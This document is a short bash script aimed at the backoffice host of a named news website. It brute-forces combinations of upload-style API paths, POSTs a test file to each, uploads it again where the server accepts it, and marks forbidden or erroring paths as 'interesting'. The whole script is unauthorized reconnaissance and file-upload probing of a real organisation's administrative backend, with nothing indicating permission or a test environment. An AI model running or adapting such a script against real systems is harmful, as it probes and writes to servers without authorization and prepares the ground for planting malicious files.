#!/bin/bash
host="https://backoffice.bangladeshguardian.com"
suffixes=("upload" "upload-image" "image-upload" "media-upload" "upload-media" "save-image" "store-image" "upload-file" "file-upload")
prefixes=("/api-en" "/api" "/api/v1" "/media" "/storage" "/public" "/admin" "")

for pre in "${prefixes[@]}"; do
  for suf in "${suffixes[@]}"; do
    path="$pre/$suf"
    code=$(curl -s -o /dev/null -w "%{http_code}" -X POST -F "file=@test.txt" "$host$path")
    if [ "$code" == "200" ] || [ "$code" == "201" ]; then
      echo "SUCCESS: $path (Code: $code)"
      curl -s -X POST -F "file=@test.txt" "$host$path"
      echo ""
    elif [ "$code" == "401" ] || [ "$code" == "403" ] || [ "$code" == "500" ]; then
      echo "INTERESTING: $path (Code: $code)"
    fi
  done
done
